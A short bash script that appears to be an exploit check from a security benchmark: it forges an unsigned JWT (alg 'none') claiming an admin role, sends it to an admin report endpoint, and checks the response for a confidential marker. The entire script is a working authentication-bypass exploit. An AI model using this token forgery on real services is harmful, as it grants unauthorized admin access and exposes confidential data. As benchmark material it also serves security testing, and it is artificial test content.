#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
token=$(python3 - <<'PY'
import base64,json
enc=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
print(enc({'alg':'none','typ':'JWT'})+'.'+enc({'sub':1,'role':'admin','email':'attacker@bench.local'})+'.')
PY
)
curl -s -H "authorization: Bearer $token" "$TARGET/api/reports/admin-summary" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
